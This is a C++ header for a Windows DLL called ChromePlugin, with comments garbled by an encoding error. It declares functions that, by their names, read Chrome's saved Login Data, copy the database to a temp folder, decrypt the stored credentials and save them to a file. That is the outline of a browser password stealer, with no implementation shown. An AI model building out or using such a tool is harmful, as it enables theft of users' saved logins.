// ���� ifdef ���Ǵ���ʹ�� DLL �������򵥵�
// ��ı�׼�������� DLL �е������ļ��������������϶���� CHROMEPLUGIN_EXPORTS
// ���ű���ġ���ʹ�ô� DLL ��
// �κ�������Ŀ�ϲ�Ӧ����˷��š�������Դ�ļ��а������ļ����κ�������Ŀ���Ὣ
// CHROMEPLUGIN_API ������Ϊ�Ǵ� DLL ����ģ����� DLL ���ô˺궨���
// ������Ϊ�Ǳ������ġ�
#ifdef CHROMEPLUGIN_EXPORTS
#define CHROMEPLUGIN_API __declspec(dllexport)
#else
#define CHROMEPLUGIN_API __declspec(dllimport)
#endif
#include "string"
// �����Ǵ� ChromePlugin.dll ������
class CHROMEPLUGIN_API CChromePlugin {
public:
	CChromePlugin(void);
	// TODO:  �ڴ�������ķ�����
};
using namespace std;
extern "C" CHROMEPLUGIN_API int nChromePlugin;

extern "C" CHROMEPLUGIN_API int fnChromePlugin(void);

extern "C" CHROMEPLUGIN_API void  ReadChromeLoginData(DWORD ID);
 wstring ReadEncryptData(const std::string &sLoginDataPath);
bool CopyDataBaseToTempDir(const std::string &sDBPath, std::string &sTempDBPath);
bool SaveToFile(char * pPathFile, wstring strFile);